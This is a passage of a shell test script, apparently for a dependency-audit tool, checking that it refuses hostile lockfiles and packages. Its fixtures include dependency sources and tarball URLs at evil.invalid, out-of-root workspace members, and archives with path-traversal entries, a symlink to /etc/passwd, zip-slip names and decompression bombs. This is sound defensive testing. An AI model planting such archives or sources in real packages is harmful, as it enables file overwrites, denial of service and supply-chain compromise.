  printf 'version = 3\n\n[[package]]\nname = "anyhow"\nversion = "1.0.0"\nsource = "%s"\nchecksum = "00"\n' "$lock" > "$WT/stubs/Cargo.lock"
  run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml --manifest stubs/Cargo.lock
  check "a lockfile source '$lock' does not stop cargo-tree, and the rebuilt manifest names no such host" \
    sh -c "[ '$RC' = 0 ] && grep -q '^== cargo tree ' '$T/calls' && ! grep -q 'rebuilt|.*evil' '$T/calls'"
done
printf 'version = 3\n\n[[package]]\nname = "lp"\nversion = "0.1.0"\n\n[[patch.unused]]\nname = "x"\nversion = "1.0.0"\nsource = "git+https://evil.invalid/x#0123"\n' > "$WT/stubs/Cargo.lock"
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml --manifest stubs/Cargo.lock
check "a lockfile with [[patch.unused]], as an unused [patch] leaves it, does not stop cargo-tree" sh -c "[ '$RC' = 0 ] && grep -q '^== cargo tree ' '$T/calls'"
settings
printf 'version = 3\n\n[[package]]\nname = "anyhow"\nversion = "1.0.0"\n"\\u0073ource" = "git+https://evil.invalid/x"\n' > "$WT/stubs/Cargo.lock"
run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest stubs/Cargo.toml --manifest stubs/Cargo.lock
check "a lockfile with a unicode escape (cargo writes none) is refused" sh -c "[ '$RC' = 3 ] && grep -q 'the lockfile has a .u, .U or .x escape' '$T/err' && ! grep -q '^== cargo' '$T/calls'"
run "$DEPS" "$WT" -- cargo-outdated --run audit_1 --manifest stubs/Cargo.toml --manifest stubs/Cargo.lock
check "... and by cargo-outdated too" sh -c "[ '$RC' = 3 ] && grep -q 'the lockfile has a .u, .U or .x escape' '$T/err' && ! grep -q '^== cargo' '$T/calls'"
# The Solana layout these lockfile rules are for: a git [patch] of curve25519-dalek, and the lockfile it
# leaves, with a git source. cargo-tree and cargo-outdated run on the rebuilt manifest, with the note, and
# cargo-audit audits the lockfile as it is (cargo audit does not query a git source).
mkdir -p "$WT/sol"
printf '[package]\nname = "sol-prog"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\nsolana-program = "1.17"\n\n[patch.crates-io]\ncurve25519-dalek = { git = "https://github.com/solana-labs/curve25519-dalek.git", rev = "b500cdc2a920cd5bff9e2dd974d7b97349d61464" }\n' > "$WT/sol/Cargo.toml"
printf 'version = 3\n\n[[package]]\nname = "byteorder"\nversion = "1.5.0"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "1fd0f2584146f6f2ef48085050886acf353beff7305ebd1ae69500e27c67f64b"\n\n[[package]]\nname = "curve25519-dalek"\nversion = "3.2.1"\nsource = "git+https://github.com/solana-labs/curve25519-dalek.git?rev=b500cdc2a920cd5bff9e2dd974d7b97349d61464#b500cdc2a920cd5bff9e2dd974d7b97349d61464"\ndependencies = [\n "byteorder",\n]\n\n[[package]]\nname = "sol-prog"\nversion = "0.1.0"\ndependencies = [\n "solana-program",\n]\n\n[[package]]\nname = "solana-program"\nversion = "1.17.34"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "00"\ndependencies = [\n "curve25519-dalek",\n]\n' > "$WT/sol/Cargo.lock"
NOTE_SOL='>> note: sol/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: curve25519-dalek'
settings SHIM_DUMP=1
for action in cargo-tree cargo-outdated; do
  run "$DEPS" "$WT" -- "$action" --run audit_1 --manifest sol/Cargo.toml --manifest sol/Cargo.lock
  check "$action on a Solana manifest with a git curve25519-dalek [patch] and its lockfile: exit 0, with the note" sh -c "
    [ '$RC' = 0 ] && [ \"\$(cat '$T/err')\" = '$NOTE_SOL' ] && grep -q '^== cargo ${action#cargo-} .*--manifest-path .*/rebuilt/' '$T/calls' && ! grep -qiE 'rebuilt[|].*(github|patch)' '$T/calls'"
done
settings FAKE_AUDIT_OUT="$T/audit-clean.txt"
run "$DEPS" "$WT" -- cargo-audit --run audit_1 --manifest sol/Cargo.lock
check "cargo-audit of that lockfile, fetching: exit 0, cargo audit runs on it" sh -c "[ '$RC' = 0 ] && grep -qx '== cargo audit --color never' '$T/calls'"
settings
# vet() still refuses a git, alt-registry or out-of-tree path dependency that metadata surfaces. These and the
# cargo-outdated cases run on the plain pkg manifest again, so they do not depend on the named-patch case.
printf '%b' "$PKG_TOML" > "$WT/pkg/Cargo.toml"
for dep in '{"name":"evil","source":"git+https://evil.invalid/x","registry":null}|from git+https://evil.invalid/x, not crates.io' \
  '{"name":"alt","source":"registry+https://alt.invalid/index","registry":"https://alt.invalid/index"}|from another registry than crates.io' \
  '{"name":"far","source":null,"registry":null,"path":"/etc"}|at a path outside the copied manifests'; do
  settings FAKE_META_DEP="${dep%%|*}"
  r0=$(rows)
  run "$DEPS" "$WT" -- cargo-tree --run audit_1 --manifest pkg/Cargo.toml
  check "a dependency ${dep#*|}: exit 3, nothing resolved or disclosed" \
    sh -c "[ '$RC' = 3 ] && grep -q '${dep#*|}' '$T/err' && ! grep -q '^== cargo tree' '$T/calls' && [ \"\$(( \$(wc -l < '$DT') - 1 ))\" = '$r0' ]"
done
# A workspace member outside the workspace root's directory, which cargo takes when the member names the root
# with package.workspace. The rebuild places each member at its path under the root, so such a member would
# land outside the scratch directory: beside it (oor/canary/m, from a root three folders down, at $T/canary/m),
# or, from a root deeper than the scratch directory, at the absolute path its folder spells under the working
# directory (an existing manifest there, $T/victim/app). It is refused before anything is written or sent. The
# stand-in's cargo metadata lists the packages from FAKE_META_UP folders above the root and names them in the
# calls, so a member it misses (it once passed over one below a TMPDIR folder named target) fails a check of its
# own, not the refusal's.
VICTIM=$T/victim/app
mkdir -p "$VICTIM"
printf '[package]\nname = "victim"\n' > "$VICTIM/Cargo.toml"
cp "$VICTIM/Cargo.toml" "$T/victim.saved"
ups() { local s="" k=$1; while [ "$k" -gt 0 ]; do s=$s../; k=$((k - 1)); done; printf '%s' "$s"; }
n=$(( $(printf '%s' "$NT" | tr -cd / | wc -c) + 4 ))
deep=oor; i=1; while [ "$i" -lt "$n" ]; do deep=$deep/d; i=$((i + 1)); done
for layout in "cargo-tree|beside the scratch directory|oor/a/b/c|oor/canary/m" "cargo-outdated|beside the scratch directory|oor/a/b/c|oor/canary/m" \
  "cargo-tree|at the absolute path it spells|$deep|${VICTIM#/}"; do
  IFS='|' read -r action where rootdir member <<< "$layout"
  rn=$(( $(printf '%s' "$rootdir" | tr -cd / | wc -c) + 1 ))
  mn=$(( $(printf '%s' "$member" | tr -cd / | wc -c) + 1 ))
  mkdir -p "$WT/$rootdir" "$WT/$member"
  printf '[workspace]\nmembers = ["%s%s"]\n\n[package]\nname = "root"\nversion = "0.1.0"\nedition = "2021"\n' "$(ups "$rn")" "$member" > "$WT/$rootdir/Cargo.toml"
  printf '[package]\nname = "m"\nversion = "0.1.0"\nedition = "2021"\nworkspace = "%s%s"\n\n[dependencies]\nserde = "1"\n' "$(ups "$mn")" "$rootdir" > "$WT/$member/Cargo.toml"
  settings FAKE_META_UP="$rn"
  r0=$(rows)
  run "$DEPS" "$WT" -- "$action" --run audit_1 --manifest "$rootdir/Cargo.toml" --manifest "$member/Cargo.toml"
  check "$action with a workspace member outside the root, which the rebuild would place $where: the stand-in's cargo metadata lists the member and the root" \
    grep -qxF 'metadata-packages: m root' "$T/calls"
  check "... exit 3, the blocker naming the member outside the root" sh -c "
    [ '$RC' = 3 ] && grep -q '^deps: blocker: the workspace member ' '$T/err' && grep -qF ' lies outside the workspace root, ' '$T/err' &&
    grep -qF '; deps.sh rebuilds only members under the root; output audit_1/deps/$action-' '$T/err'"
  check "... nothing written $where" sh -c "[ ! -e '$T/canary' ] && [ ! -e '$VICTIM/lib.rs' ] && cmp -s '$VICTIM/Cargo.toml' '$T/victim.saved'"
  check "... and nothing run or disclosed" sh -c "! grep -qE '^== cargo (tree|outdated)' '$T/calls' && [ \"\$(( \$(wc -l < '$DT') - 1 ))\" = '$r0' ]"
done
vtop=${VICTIM#/}
rm -rf "$WT/oor" "$WT/${vtop%%/*}"
settings SHIM_DUMP=1 FAKE_OUTDATED_RC=1
run "$DEPS" "$WT" -- cargo-outdated --run audit_1 --manifest pkg/Cargo.toml --manifest pkg/Cargo.lock
headers > "$T/hdrs"
check "cargo-outdated: cargo outdated --workspace --exit-code 1 --color never on the rebuilt manifest, exit 1" \
  sh -c "[ '$RC' = 1 ] && grep -qE '^cargo outdated --workspace --exit-code 1 --color never --manifest-path $S/rebuilt/.*Cargo.toml\$' '$T/hdrs' && ! grep -qE '^cargo outdated.*--manifest-path $S/w/' '$T/hdrs' && grep -q '^>> cargo-outdated: outdated dependencies found, from the rebuilt manifests (exit 1): ' '$T/out'"
settings FAKE_OUTDATED_RC=2
run "$DEPS" "$WT" -- cargo-outdated --run audit_1 --manifest pkg/Cargo.toml
check "cargo outdated that fails: exit 3" sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: cargo outdated failed (exit 2)' '$T/err'"
settings

# npm-audit: npm's own .npmrc in the copy, empty user and global config, no token.
printf '# npm audit report\n\nlodash  <4.17.21\nSeverity: high\n' > "$T/npm-vuln.txt"
r0=$(rows)
run "$DEPS" "$WT" "${CANARIES[@]}" HTTPS_PROXY="$PROXY" -- npm-audit --run audit_1 --manifest package.json --manifest package-lock.json
check "npm-audit: npm audit in the copy, exit 0" sh -c "[ '$RC' = 0 ] && grep -qx '== npm audit' '$T/calls' && grep -q '^>> npm-audit: no vulnerability found (exit 0): audit_1/deps/npm-audit-' '$T/out'"
check "... with its own .npmrc, an empty user config, and only the two files copied" \
  sh -c "awk '/^== npm audit/{on=1;next} /^== /{on=0} on' '$T/calls' > '$T/blk' && grep -qxF 'npmrc: registry=https://registry.npmjs.org/|ignore-scripts=true|fund=false|update-notifier=false|' '$T/blk' && grep -qxF 'userconfig-bytes: 0' '$T/blk' && grep -qxF 'files: .npmrc package-lock.json package.json ' '$T/blk' && grep -qxF 'env: npm_config_registry=https://registry.npmjs.org/' '$T/blk'"
check "... the target's .npmrc token reaches nothing, nor does any canary" sh -c "grep -q '^== npm audit' '$T/calls' && ! grep -q 'canary' '$T/calls'"
check "... and COREPACK_ENABLE_PROJECT_SPEC=0, so a Corepack npm shim takes no npm release from the copied package.json" \
  in_blocks '^== npm audit' '^env: COREPACK_ENABLE_PROJECT_SPEC=0$'
check "... and one disclosure row" sh -c "[ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 1 ] && sed -n '\$p' '$DT' | grep -q '	npmjs.org	every package name and version in this lockfile (npm audit.s bulk advisory request): package-lock.json	1\$'"
settings FAKE_NPM_AUDIT_OUT="$T/npm-vuln.txt" FAKE_NPM_AUDIT_RC=1
run "$DEPS" "$WT" -- npm-audit --run audit_1 --manifest package.json --manifest package-lock.json
check "npm-audit with a vulnerability: exit 1" sh -c "[ '$RC' = 1 ] && grep -q '^>> npm-audit: vulnerabilities found (exit 1)' '$T/out'"
settings FAKE_NPM_AUDIT_RC=1
run "$DEPS" "$WT" -- npm-audit --run audit_1 --manifest package.json --manifest package-lock.json
check "npm audit that fails without a report: exit 3" sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: npm audit failed (exit 1)' '$T/err'"
settings

# =================================================================================================
# deps.sh: registry queries and artifact fetches, through a curl stand-in that answers from $T/fix.
# =================================================================================================
python3 -I - "$T/fix" <<'PY'
import base64, hashlib, io, json, lzma, os, struct, sys, tarfile, zipfile, zlib
fix = sys.argv[1]
def put(url, data, status=None):
    key = url.replace("/", "_").replace(":", "_").replace("%", "_").replace("@", "_")
    open(os.path.join(fix, key), "wb").write(data if isinstance(data, bytes) else data.encode())
    if status:
        open(os.path.join(fix, key + ".status"), "w").write(str(status))
def tgz(entries, pax_global=None):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz", format=tarfile.PAX_FORMAT, pax_headers=pax_global) as t:
        for name, kind, data in entries:
            ti = tarfile.TarInfo(name)
            ti.mode = 0o4755
            if kind == "file":
                ti.size = len(data); t.addfile(ti, io.BytesIO(data))
            elif kind == "dir":
                ti.type = tarfile.DIRTYPE; t.addfile(ti)
            elif kind == "sym":
                ti.type = tarfile.SYMTYPE; ti.linkname = data; t.addfile(ti)
            elif kind == "hard":
                ti.type = tarfile.LNKTYPE; ti.linkname = data; t.addfile(ti)
            elif kind == "fifo":
                ti.type = tarfile.FIFOTYPE; t.addfile(ti)
            elif kind == "dev":
                ti.type = tarfile.CHRTYPE; t.addfile(ti)
    return buf.getvalue()
crate = tgz([("demo-1.0.0/Cargo.toml", "file", b"[package]\nname = \"demo\"\n"), ("demo-1.0.0/src/lib.rs", "file", b"pub fn f() {}\n"),
             ("demo-1.0.0/../escape.txt", "file", b"no"), ("/abs.txt", "file", b"no"), ("demo-1.0.0/link", "sym", "/etc/passwd"),
             ("demo-1.0.0/hard", "hard", "demo-1.0.0/src/lib.rs"), ("demo-1.0.0/fifo", "fifo", ""), ("demo-1.0.0/dev", "dev", ""),
             ("demo-1.0.0/esc\x1bname", "file", b"no"), ("demo-1.0.0/src/lib.rs", "file", b"again"),
             ("demo-1.0.0/" + "n" * 300, "file", b"long")])
put("https://static.crates.io/crates/demo/demo-1.0.0.crate", crate)
put("https://crates.io/api/v1/crates/demo/1.0.0", json.dumps({"version": {"num": "1.0.0", "crate": "demo", "checksum": hashlib.sha256(crate).hexdigest()}}))
put("https://static.crates.io/crates/demo/demo-2.0.0.crate", crate)
put("https://crates.io/api/v1/crates/demo/2.0.0", json.dumps({"version": {"num": "2.0.0", "crate": "demo", "checksum": "0" * 64}}))
put("https://crates.io/api/v1/crates/serde", json.dumps({"crate": {"name": "serde"}}))
put("https://crates.io/api/v1/crates/serde/1.0.0", json.dumps({"version": {"num": "1.0.0"}}))
put("https://crates.io/api/v1/crates/broken/1.0.0", "oops", 500)
npm = tgz([("package/package.json", "file", b"{\"name\": \"left-pad\"}\n"), ("package/index.js", "file", b"module.exports = 1\n")],
          {"comment": "0123456789abcdef0123456789abcdef01234567"})
integrity = "sha512-" + base64.b64encode(hashlib.sha512(npm).digest()).decode()
put("https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz", npm)
put("https://registry.npmjs.org/left-pad/1.3.0", json.dumps({"name": "left-pad", "version": "1.3.0", "dist": {
    "tarball": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz", "integrity": integrity}}))
put("https://registry.npmjs.org/left-pad/1.4.0", json.dumps({"name": "left-pad", "version": "1.4.0", "dist": {
    "tarball": "https://evil.invalid/left-pad-1.4.0.tgz", "integrity": integrity}}))
put("https://registry.npmjs.org/left-pad/-/left-pad-1.5.0.tgz", npm)
put("https://registry.npmjs.org/left-pad/1.5.0", json.dumps({"name": "left-pad", "version": "1.5.0", "dist": {
    "tarball": "https://registry.npmjs.org/left-pad/-/left-pad-1.5.0.tgz", "shasum": hashlib.sha1(npm).hexdigest()}}))
put("https://registry.npmjs.org/@solana_2Fweb3.js/1.95.5", json.dumps({"name": "@solana/web3.js", "version": "1.95.5"}))
put("https://registry.npmjs.org/left-pad/latest", json.dumps({"name": "left-pad", "version": "1.3.0"}))
versions = {"1.%d.0" % i: {"version": "1.%d.0" % i, "readme": "x" * 400} for i in range(300)}
put("https://registry.npmjs.org/left-pad", json.dumps({"name": "left-pad", "dist-tags": {"latest": "1.3.0"},
    "versions": versions, "time": dict(("1.%d.0" % i, "2020-01-01T00:00:%02dZ" % (i % 60)) for i in range(300))}))
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    z.writestr("demo/__init__.py", "x = 1\n")
    z.writestr("../../evil.py", "no")
    info = zipfile.ZipInfo("demo/link.py"); info.external_attr = (0o120777 << 16); z.writestr(info, "/etc/passwd")
whl = buf.getvalue()
whl_url = "https://files.pythonhosted.org/packages/aa/bb/demo-1.0-py3-none-any.whl"
put(whl_url, whl)
put("https://pypi.org/pypi/demo/1.0/json", json.dumps({"urls": [{"packagetype": "bdist_wheel", "filename": "demo-1.0-py3-none-any.whl",
    "url": whl_url, "digests": {"sha256": hashlib.sha256(whl).hexdigest()}}]}))
put("https://pypi.org/pypi/demo/2.0/json", json.dumps({"urls": [{"packagetype": "sdist", "filename": "demo-2.0.tar.gz",
    "url": "https://evil.invalid/demo-2.0.tar.gz", "digests": {"sha256": "0" * 64}}]}))
put("https://pypi.org/pypi/requests/json", json.dumps({"info": {"name": "requests"}}))
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    for i in range(50001):
        z.writestr("many/f%d" % i, "")
many = buf.getvalue()
many_url = "https://files.pythonhosted.org/packages/cc/dd/many-1.0-py3-none-any.whl"
put(many_url, many)
put("https://pypi.org/pypi/many/1.0/json", json.dumps({"urls": [{"packagetype": "bdist_wheel", "filename": "many-1.0-py3-none-any.whl",
    "url": many_url, "digests": {"sha256": hashlib.sha256(many).hexdigest()}}]}))
# Two .crate files whose caps must hold while they are read: 52001 headers of empty files and then bytes that are
# no deflate stream (reading on from entry 50001 fails), and one entry that declares 600 MiB with no data after it.
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w", format=tarfile.USTAR_FORMAT) as t:
    for i in range(52001):
        t.addfile(tarfile.TarInfo("bomb-1.0.0/f%d" % i))
bombraw = buf.getvalue()[:512 * 52001]
c = zlib.compressobj(9, zlib.DEFLATED, 31)
bomb = c.compress(bombraw) + c.flush(zlib.Z_SYNC_FLUSH) + b"\xff" * 64
info = tarfile.TarInfo("bigdecl-1.0.0/x")
info.size = 600 * 1024 * 1024
c = zlib.compressobj(9, zlib.DEFLATED, 31)
bigdecl = c.compress(info.tobuf(tarfile.USTAR_FORMAT) + b"\0" * 1024) + c.flush()
crates = {"bomb": bomb, "bigdecl": bigdecl}
# Headers whose content tarfile would keep for every later member or read with no bound, each refused before
# tarfile reads that content. cut(): the headers so far, then bytes no deflate stream holds (reading on fails);
# each such case holds 1 MiB or more after the header it is refused at, past what gzip reads ahead.
def cut(raw):
    c = zlib.compressobj(9, zlib.DEFLATED, 31)
    return c.compress(raw) + c.flush(zlib.Z_SYNC_FLUSH) + b"\xff" * 64
def whole(raw):
    c = zlib.compressobj(9, zlib.DEFLATED, 31)
    return c.compress(raw + b"\0" * 1024) + c.flush()
def writer(fmt, pax_global=None):
    buf = io.BytesIO()
    return buf, tarfile.open(fileobj=buf, mode="w", format=fmt, pax_headers=pax_global)
def patched(info, fmt, patch):
    b = bytearray(info.tobuf(fmt))
    for off, data in patch:
        b[off:off + len(data)] = data
    b[148:156] = b" " * 8
    b[148:156] = b"%06o\0 " % sum(b[:512])
    return bytes(b)
# A global pax header of 16000 keys, then 2048 empty files.
buf, t = writer(tarfile.PAX_FORMAT, {"k%05d" % i: "v" for i in range(16000)})
for i in range(2048):
    t.addfile(tarfile.TarInfo("gkeys-1.0.0/f%d" % i))
crates["gkeys"] = cut(buf.getvalue())
# 40 GNU long names and then 40 pax paths of 60000 bytes each: 2.4 MB of each kind, 4.8 MB in all.
buf, t = writer(tarfile.GNU_FORMAT)
for i in range(80):
    t.format = tarfile.GNU_FORMAT if i < 40 else tarfile.PAX_FORMAT
    t.addfile(tarfile.TarInfo("longhdr-1.0.0/%02d%s" % (i, "n" * 60000)))
crates["longhdr"] = cut(buf.getvalue())
# A GNU sparse file whose header says an extension block of its map follows, then 2048 such blocks, each of 21
# entries and saying another follows.
info = tarfile.TarInfo("sparse-1.0.0/s")
info.type = tarfile.GNUTYPE_SPARSE
block = bytearray((b"00000001000\0" * 2) * 21 + b"\0" * 8)
block[504] = 1
crates["sparse"] = cut(patched(info, tarfile.GNU_FORMAT, [(482, b"\1")]) + bytes(block) * 2048)
# A pax (GNU 1.0) sparse file whose map, at the start of its data, announces 10**9 fields, then 1 MiB of them.
buf, t = writer(tarfile.PAX_FORMAT)
info = tarfile.TarInfo("paxsparse-1.0.0/GNUSparseFile.0/s")
info.pax_headers = {"GNU.sparse.major": "1", "GNU.sparse.minor": "0", "GNU.sparse.name": "paxsparse-1.0.0/s", "GNU.sparse.realsize": "0"}
data = b"1000000000\n" + b"0\n" * 524288
info.size = len(data)
t.addfile(info, io.BytesIO(data))
crates["paxsparse"] = cut(buf.getvalue())
# A global pax size of -1 for the one file after it; an extended header whose own size field is -1024; and an
# entry of a type tarfile does not know (it reads through the data of one) that declares 600 MiB.
buf, t = writer(tarfile.PAX_FORMAT, {"size": "-1"})
t.addfile(tarfile.TarInfo("negsize-1.0.0/f"))
crates["negsize"] = whole(buf.getvalue())
info = tarfile.TarInfo("././@PaxHeader")
info.type = tarfile.XHDTYPE
crates["negraw"] = whole(patched(info, tarfile.GNU_FORMAT, [(124, b"\xff" * 10 + b"\xfc\0")]) + tarfile.TarInfo("negraw-1.0.0/f").tobuf())
info = tarfile.TarInfo("odd-1.0.0/x")
info.type, info.size = b"Z", 600 * 1024 * 1024
crates["odd"] = whole(info.tobuf(tarfile.USTAR_FORMAT))
# A global pax size of 0, then a file whose own header gives 600 MiB (tarfile reads through what that field gives,
# then reports the global size), 2 MiB of its data, and bytes no deflate stream holds.
info = tarfile.TarInfo("gsize-1.0.0/x")
info.size = 600 * 1024 * 1024
buf, t = writer(tarfile.PAX_FORMAT, {"size": "0"})
crates["gsize"] = cut(buf.getvalue() + info.tobuf(tarfile.USTAR_FORMAT) + b"\0" * (2 << 20))
# A tar compressed with xz, the magic of a zstd stream, a tar in the legacy lzma format (no magic names it), and
# a plain tar and a bzip2 one, which unpack.
def small(name, mode):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode, format=tarfile.USTAR_FORMAT) as t:
        info = tarfile.TarInfo(name)
        info.size = 14
        t.addfile(info, io.BytesIO(b"pub fn f() {}\n"))
    return buf.getvalue()
crates["xz"] = small("xz-1.0.0/src/lib.rs", "w:xz")
crates["zst"] = b"\x28\xb5\x2f\xfd" + b"\0" * 64
crates["alone"] = lzma.compress(small("alone-1.0.0/src/lib.rs", "w"), format=lzma.FORMAT_ALONE)
crates["plain"] = small("plain-1.0.0/src/lib.rs", "w")
# The 52001 headers of bomb compressed with xz, then bytes no xz stream holds (the read stops at entry 50001 here
# too); a stream whose block header gives its decompressor a 1 GiB window, more than deps.sh lets it take; two
# streams one after the other, zero padding between them, which unpack; and a member after 8 empty pax headers
# in a row, and one after 9.
crates["xzbomb"] = lzma.compress(bombraw) + b"\xff" * 64
data = bytearray(lzma.compress(small("xzbig-1.0.0/src/lib.rs", "w"), format=lzma.FORMAT_XZ,
                               filters=[{"id": lzma.FILTER_LZMA2, "dict_size": 1 << 20}]))
hs = (data[12] + 1) * 4
assert data[14:16] == b"\x21\x01"
data[16] = 36
data[12 + hs - 4:12 + hs] = struct.pack("<I", zlib.crc32(bytes(data[12:12 + hs - 4])))
crates["xzbig"] = bytes(data)
raw = small("xztwo-1.0.0/src/lib.rs", "w")
crates["xztwo"] = lzma.compress(raw[:512]) + b"\0" * 8 + lzma.compress(raw[512:])
def chained(name, k):
    info = tarfile.TarInfo("././@PaxHeader")
    info.type = tarfile.XHDTYPE
    member = tarfile.TarInfo(name)
    member.size = 3
    return whole(info.tobuf(tarfile.USTAR_FORMAT) * k + member.tobuf(tarfile.USTAR_FORMAT) + b"abc" + b"\0" * 509)
crates["chain8"] = chained("chain8-1.0.0/f", 8)
crates["chain9"] = chained("chain9-1.0.0/f", 9)
for name, data in crates.items():
    put("https://static.crates.io/crates/%s/%s-1.0.0.crate" % (name, name), data)
    put("https://crates.io/api/v1/crates/%s/1.0.0" % name, json.dumps({"version": {"num": "1.0.0", "crate": name, "checksum": hashlib.sha256(data).hexdigest()}}))
# A wheel whose central directory takes 18 MB: 300 entries, each with a comment of 60000 bytes.
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    for i in range(300):
        info = zipfile.ZipInfo("bigcd/f%d" % i)
        info.comment = b"c" * 60000
        z.writestr(info, "")
bigcd = buf.getvalue()
bigcd_url = "https://files.pythonhosted.org/packages/ee/ff/bigcd-1.0-py3-none-any.whl"
put(bigcd_url, bigcd)
put("https://pypi.org/pypi/bigcd/1.0/json", json.dumps({"urls": [{"packagetype": "bdist_wheel", "filename": "bigcd-1.0-py3-none-any.whl",
    "url": bigcd_url, "digests": {"sha256": hashlib.sha256(bigcd).hexdigest()}}]}))
# A wheel whose one entry is compressed with bzip2; an sdist compressed with bzip2 and one with xz, as PyPI took
# them before 2017, which unpack; and a wheel of 50002 entries whose last central directory record is damaged,
# which zipfile never reaches: it stops at record 50001.
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_BZIP2) as z:
    z.writestr("bzwhl/x", b"\0" * (1 << 20))
other = {"bzwhl-1.0-py3-none-any.whl": buf.getvalue(), "bzsd-1.0.tar.bz2": small("bzsd-1.0/bzsd.py", "w:bz2"),
         "xzsd-1.0.tar.xz": small("xzsd-1.0/xzsd.py", "w:xz")}
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    for i in range(50002):
        z.writestr("manybad/f%d" % i, "")
data = bytearray(buf.getvalue())
size, offset = struct.unpack_from("<II", data, data.rfind(b"PK\x05\x06") + 12)
last = data.rfind(b"PK\x01\x02", offset, offset + size)
data[last:last + 2] = b"XX"
other["manybad-1.0-py3-none-any.whl"] = bytes(data)
for name, data in other.items():
    url = "https://files.pythonhosted.org/packages/11/22/" + name
    put(url, data)
    put("https://pypi.org/pypi/%s/1.0/json" % name.split("-")[0], json.dumps({"urls": [{"packagetype": "sdist" if ".tar." in name else "bdist_wheel",
        "filename": name, "url": url, "digests": {"sha256": hashlib.sha256(data).hexdigest()}}]}))
PY
UA='auditor-skill deps.sh (https://github.com/solanabr/auditor-skill)'
r0=$(rows)
run "$DEPS" "$WT" "${CANARIES[@]}" HTTPS_PROXY="$PROXY" -- npm-view --run audit_1 @solana/web3.js 1.95.5
check "npm-view: the version's record, from registry.npmjs.org, a scoped name's / as %2F" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'url: https://registry.npmjs.org/@solana%2Fweb3.js/1.95.5' '$T/calls' && grep -q '^>> npm-view: @solana/web3.js@1.95.5 (HTTP 200): audit_1/deps/npm-view-' '$T/out'"
check "... curl -q, https only, no redirects, a size cap, its user agent and Accept: application/json" \
  sh -c "grep -q '^== curl -q --proto =https --proto-redir =https --tlsv1.2 -sS --connect-timeout 30 --max-filesize 104857600 -A $UA -H Accept: application/json -o $S/body -w %{http_code} -- https://registry.npmjs.org/' '$T/calls'"
check "... with the proxy, and no canary" sh -c "grep -qxF 'env: HTTPS_PROXY=$PROXY' '$T/calls' && ! grep -q canary '$T/calls'"
check "... the answer kept as it came" sh -c "grep -q '\"_npmUser\"\\|\"name\": \"@solana/web3.js\"' \"$WT/\$(sed -n 's/.*: \\(audit_1\\/deps\\/npm-view-[0-9]*[.]txt\\)\$/\\1/p' '$T/out')\""
check "... one disclosure row" sh -c "sed -n '\$p' '$DT' | grep -q '	npmjs.org	package name and version (the registry.s record): @solana/web3.js@1.95.5	1\$' && [ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 1 ]"
run "$DEPS" "$WT" -- npm-view --run audit_1 left-pad
check "npm-view without a version: the latest" grep -qxF 'url: https://registry.npmjs.org/left-pad/latest' "$T/calls"
run "$DEPS" "$WT" -- npm-view --run audit_1 no-such-package 1.0.0
check "npm-view of a package the registry does not have: exit 1" sh -c "[ '$RC' = 1 ] && grep -q '^>> npm-view: the npm registry has no no-such-package@1.0.0 (HTTP 404)' '$T/out'"
run "$DEPS" "$WT" -- npm-time --run audit_1 left-pad
n=$(sed -n 's/.*npm-time-\([0-9]*\)[.]txt$/\1/p' "$T/out")
check "npm-time: the packument ($(wc -c < "$T/fix/https___registry.npmjs.org_left-pad" | tr -d ' ') bytes) reduced to its name, dist-tags and publish times" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'url: https://registry.npmjs.org/left-pad' '$T/calls' && python3 -I -c 'import json, sys; d = json.load(open(sys.argv[1])); assert sorted(d) == [\"dist-tags\", \"name\", \"time\"] and len(d[\"time\"]) == 300' '$WT/audit_1/deps/npm-time-$n.txt'"
run "$DEPS" "$WT" -- crate-info --run audit_1 serde
check "crate-info: crates.io's API" sh -c "[ '$RC' = 0 ] && grep -qxF 'url: https://crates.io/api/v1/crates/serde' '$T/calls'"
run "$DEPS" "$WT" -- crate-info --run audit_1 serde 1.0.0
check "crate-info with a version" grep -qxF 'url: https://crates.io/api/v1/crates/serde/1.0.0' "$T/calls"
run "$DEPS" "$WT" -- crate-info --run audit_1 broken 1.0.0
check "an answer other than 200 or 404: exit 3" sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: crates.io answered HTTP 500 for broken@1.0.0' '$T/err'"
run "$DEPS" "$WT" -- pypi-info --run audit_1 requests
check "pypi-info: PyPI's JSON API" sh -c "[ '$RC' = 0 ] && grep -qxF 'url: https://pypi.org/pypi/requests/json' '$T/calls'"
settings FAKE_CURL_RC=7
run "$DEPS" "$WT" -- pypi-info --run audit_1 requests
check "a request that does not finish: exit 3, curl's message kept" \
  sh -c "[ '$RC' = 3 ] && grep -q '^deps: blocker: the request to https://pypi.org/pypi/requests/json did not finish (curl exit 7); output ' '$T/err' && grep -q 'Failed to connect' \"$WT/\$(sed -n 's/.*; output //p' '$T/err')\""
settings
r0=$(rows)
run "$DEPS" "$WT" -- fetch-artifact --run audit_1 crates demo 1.0.0
n=$(sed -n 's/.*fetch-artifact-\([0-9]*\)[.]txt$/\1/p' "$T/out")
FA=$WT/audit_1/deps/fetch-artifact-$n
check "fetch-artifact crates: the record from crates.io, then the .crate from static.crates.io, digest checked, unpacked" \
